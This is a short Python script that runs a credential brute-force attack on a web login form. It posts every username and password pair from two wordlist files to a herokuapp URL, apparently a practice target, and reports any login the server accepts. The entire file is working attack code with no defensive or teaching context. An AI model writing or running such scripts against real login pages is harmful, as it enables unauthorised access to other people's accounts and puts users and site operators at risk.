
import requests

try_count= 5
fail_count = 0

#this function open a file
def openFile(filePath):
    array_ = open(filePath).readlines()
    array_ = [item.replace("\n", "") for item in array_]
    return array_

#target server
url = 'http://grabme.herokuapp.com/target/'
#username field
userField = 'username'
#password field
passwordField = 'password'

passwords = openFile('password.txt')
users = openFile('users.txt')


print (" Connecting to: "+url+"......\n")

found = 0
for user in users:
    for password in passwords:
        credentials = {userField: user.replace('\n', ''),
                 passwordField: password.replace('\n', '')}

        request = requests.post(url, data=credentials)
        #print (request.text)

        #if server does not respond
        if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
            if fail_count > try_count:
                print ("Connection failed : Trying again ....")
                break
            else:
                fail_count = fail_count+1
                print ("Connection failed : 404 Not Found ")
        else:

            if 'success' in request.text or 'SUCCESS' in request.text:
                #credentials matched
                found = 1
                print("Successfully logged in with 'user: "+user+" and password: "+password+"' ")
                break
            else:
                #keep trying for the next value
                print ("Trying these parameters: username: "+user+" and password: "+password)


    if found == 1:
        print();
        break
